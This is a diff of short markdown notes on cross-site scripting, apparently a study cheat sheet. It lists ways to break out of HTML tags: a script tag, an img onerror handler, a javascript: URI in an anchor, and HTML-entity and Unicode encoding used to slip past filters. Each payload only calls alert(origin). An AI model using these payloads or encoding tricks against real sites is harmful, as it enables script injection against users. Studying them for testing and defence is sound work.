@@ -2,16 +2,21 @@
 
 ## out of tags
 
-- use a `<script` tag
-- open a tag + event handler, e.g. `<img/src/onerror=alert(origin)>`
-- `<a>` tag  + js scheme, e.g. `<a href=javascripot:alert(origin)>test</a>`
-    - plus it's HTML encoded variations (get's decoded because it's inside an html
-      attribute).
-    - combined with character reference. : --> &colon;
-    - plus Unicode encoded variations only inside js URI.
-    `<a href={htmlencoded}avascripot{character reference}{Unicoded}lert(origin)>test</a>`
+### use a `<script` tag
+### open a tag + event handler
 
-- non-executable tags
+e.g. `<img/src/onerror=alert(origin)>`
+
+### `<a>` tag  + js scheme
+
+e.g. `<a href=javascripot:alert(origin)>test</a>`
+
+- plus it's HTML encoded variations (get's decoded because it's inside an html attribute).
+- combined with character reference. : --> &colon;
+- plus Unicode encoded variations only inside js URI.  `<a
+  href={htmlencoded}avascripot{character reference}{Unicoded}lert(origin)>test</a>`
+
+### non-executable tags
 
 EX:
 
